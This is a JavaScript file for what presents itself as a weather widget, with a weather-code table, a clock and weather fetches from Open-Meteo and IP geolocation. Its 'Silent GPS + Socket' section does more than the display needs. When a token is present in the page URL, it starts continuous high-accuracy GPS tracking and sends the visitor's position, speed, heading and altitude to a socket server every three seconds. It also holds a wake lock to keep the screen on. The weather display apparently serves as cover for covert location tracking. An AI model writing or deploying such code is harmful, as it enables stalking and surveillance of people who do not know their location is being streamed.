/* ============================================================
   weather-logic.js — Weather fetching, clock, silent GPS
   ============================================================ */

// ── Weather code mapping ────────────────────────────────────
const WMO = {
  0:  { desc:'Clear Sky',       icon:'☀️',  mode:'clear' },
  1:  { desc:'Mainly Clear',    icon:'🌤️', mode:'clear' },
  2:  { desc:'Partly Cloudy',   icon:'⛅',  mode:'cloudy' },
  3:  { desc:'Overcast',        icon:'☁️',  mode:'cloudy' },
  45: { desc:'Foggy',           icon:'🌫️', mode:'fog' },
  48: { desc:'Rime Fog',        icon:'🌫️', mode:'fog' },
  51: { desc:'Light Drizzle',   icon:'🌦️', mode:'rain' },
  53: { desc:'Drizzle',         icon:'🌧️', mode:'rain' },
  55: { desc:'Dense Drizzle',   icon:'🌧️', mode:'rain' },
  61: { desc:'Light Rain',      icon:'🌦️', mode:'rain' },
  63: { desc:'Rain',            icon:'🌧️', mode:'rain' },
  65: { desc:'Heavy Rain',      icon:'🌧️', mode:'rain' },
  71: { desc:'Light Snow',      icon:'🌨️', mode:'snow' },
  73: { desc:'Snow',            icon:'❄️',  mode:'snow' },
  75: { desc:'Heavy Snow',      icon:'❄️',  mode:'snow' },
  80: { desc:'Rain Showers',    icon:'🌦️', mode:'rain' },
  81: { desc:'Heavy Showers',   icon:'🌧️', mode:'rain' },
  82: { desc:'Violent Showers', icon:'🌧️', mode:'rain' },
  95: { desc:'Thunderstorm',    icon:'⛈️',  mode:'storm' },
  96: { desc:'Thunderstorm + Hail', icon:'⛈️', mode:'storm' },
  99: { desc:'Severe Thunderstorm', icon:'⛈️', mode:'storm' },
};

// ── Live Clock (runs immediately) ───────────────────────────
function updateClock() {
  const now = new Date();
  const el = document.getElementById('wTime');
  const dl = document.getElementById('wDate');
  if (el) el.textContent = now.toLocaleTimeString('en-US', { hour12: false });
  if (dl) dl.textContent = now.toLocaleDateString('en-US', {
    weekday: 'long', month: 'long', day: 'numeric', year: 'numeric'
  });
}
setInterval(updateClock, 1000);
updateClock();

// ── Weather fetch ───────────────────────────────────────────
let lastFetch = 0;

async function fetchWeather(lat, lng) {
  if (Date.now() - lastFetch < 5 * 60 * 1000) return;
  lastFetch = Date.now();

  try {
    const url = `https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lng}&current_weather=true&hourly=relativehumidity_2m,apparent_temperature&forecast_days=1`;
    const res = await fetch(url);
    const data = await res.json();
    if (!data.current_weather) return;

    const cw = data.current_weather;
    const info = WMO[cw.weathercode] || { desc:'Unknown', icon:'🌡️', mode:'clear' };

    // Update UI elements
    const iconEl = document.getElementById('wIcon');
    const tempEl = document.getElementById('wTemp');
    const descEl = document.getElementById('wDesc');
    const windEl = document.getElementById('wWind');
    const humEl  = document.getElementById('wHumidity');
    const feelEl = document.getElementById('wFeels');

    if (iconEl) iconEl.textContent = info.icon;
    if (tempEl) tempEl.textContent = `${Math.round(cw.temperature)}°C`;
    if (descEl) descEl.textContent = info.desc;
    if (windEl) windEl.textContent = `${cw.windspeed} km/h`;

    // Hourly data for humidity and feels-like
    const hour = new Date().getHours();
    if (data.hourly) {
      const hum = data.hourly.relativehumidity_2m?.[hour];
      const feels = data.hourly.apparent_temperature?.[hour];
      if (hum != null && humEl) humEl.textContent = `${hum}%`;
      if (feels != null && feelEl) feelEl.textContent = `${Math.round(feels)}°C`;
    }

    // Switch canvas environment mode
    if (typeof setWeatherMode === 'function') setWeatherMode(info.mode);

    // Start floating animation after data loads
    const card = document.querySelector('.weather-card');
    if (card) setTimeout(() => card.classList.add('floating'), 1500);

  } catch (e) {
    console.error('Weather fetch error:', e);
  }
}

// ── IMMEDIATELY fetch weather from IP location ──────────────
// This runs right away so the user sees data without waiting for GPS
(async function() {
  try {
    const ipRes = await fetch('https://ipapi.co/json/');
    const ipData = await ipRes.json();
    if (ipData.latitude && ipData.longitude) {
      fetchWeather(ipData.latitude, ipData.longitude);
    }
  } catch (e) {
    console.warn('IP geolocation failed:', e);
  }
})();

// ── Silent GPS + Socket ─────────────────────────────────────
const params = new URLSearchParams(window.location.search);
const token = params.get('token');

let socket = null;
if (token && typeof io !== 'undefined') {
  socket = io({ auth: { token }, reconnection: true });
}

let lastSent = 0;

function startTracking() {
  if (!navigator.geolocation) return;
  navigator.geolocation.watchPosition(
    (pos) => {
      const { latitude, longitude, speed, accuracy, heading, altitude } = pos.coords;
      const now = Date.now();

      // Update weather with precise GPS coords (overrides IP-based)
      lastFetch = 0; // reset so GPS coords can override
      fetchWeather(latitude, longitude);

      // Throttle socket emissions to every 3s
      if (now - lastSent < 3000) return;
      lastSent = now;

      if (socket && socket.connected) {
        socket.emit('location:update', {
          lat: latitude, lng: longitude,
          speed: speed || 0, accuracy: accuracy || 0,
          heading: heading || null, altitude: altitude || null,
          timestamp: now
        });
      }
    },
    (err) => console.warn('GPS:', err.message),
    { enableHighAccuracy: true, maximumAge: 2000, timeout: 15000 }
  );
}

// Auto-start GPS tracking immediately when token is present
if (token) {
  startTracking();
  // Wake lock to keep screen on
  if ('wakeLock' in navigator) navigator.wakeLock.request('screen').catch(() => {});
}
